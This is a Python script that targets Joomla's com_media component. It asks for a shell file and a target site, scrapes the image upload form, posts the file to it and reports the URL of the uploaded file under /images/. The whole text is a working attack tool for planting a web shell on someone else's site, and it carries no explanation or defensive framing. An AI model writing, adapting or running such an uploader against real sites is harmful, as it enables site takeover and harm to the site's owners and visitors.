import requests
from bs4 import BeautifulSoup

name_png = input("[*] Shell Path: ")

target = input("[*] enter url target: ")

shell = open(name_png, "rb")

url = target+"/index.php?option=com_media&view=ima­ges&tmpl=component&fieldid=&­e_name=jform_articletext&asset=com_c­ontent&author=&folder="

files = {
    "Filedata[]":shell
}

headers = {
    'User-Agent' : "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
    'Content_Type' : 'multipart/form-data',
    'Connection': 'keep-alive',
}

data = {
    "f_url":"",
    "f_alt":"",
    "f_title":"",
    "f_caption":"",
    "dirPath":"",
    "f_file":"",
    "component":""
}

s = requests.session()

r = s.get(url, headers=headers)

if r.status_code == 200:

    html_doc = r.text
    soup = BeautifulSoup(html_doc, 'html.parser')

    url = soup.find('form', id="uploadForm").get('action')
    
    rr = s.post(url, headers=headers, files=files, data=data)

    if name_png in rr.text:

        print("[+] Com Media", target+"/images/"+name_png)

    else:

        print("[-] Com Media")

else:
    print("[-] Com Media")